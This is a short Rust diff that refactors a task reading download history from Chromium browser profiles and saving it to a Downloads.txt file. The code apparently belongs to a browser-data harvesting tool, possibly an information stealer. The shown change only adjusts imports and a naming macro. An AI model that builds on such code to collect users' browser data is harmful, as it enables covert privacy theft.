@@ -1,9 +1,10 @@
+use sqlite::DatabaseReader;
 use alloc::borrow::ToOwned;
 use alloc::boxed::Box;
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
-use tasks::Task;
+use tasks::{parent_name, Task};
 use utils::path::{Path, WriteToFile};
 use crate::chromium::Browser;
 use crate::Download;
@@ -24,6 +25,8 @@ impl DownloadsTask {
 }
 
 impl Task for DownloadsTask {
+    parent_name!("Downloads.txt");
+    
     unsafe fn run(&self, parent: &Path) {
         let mut downloads: Vec<Download> = self.browser
             .profiles
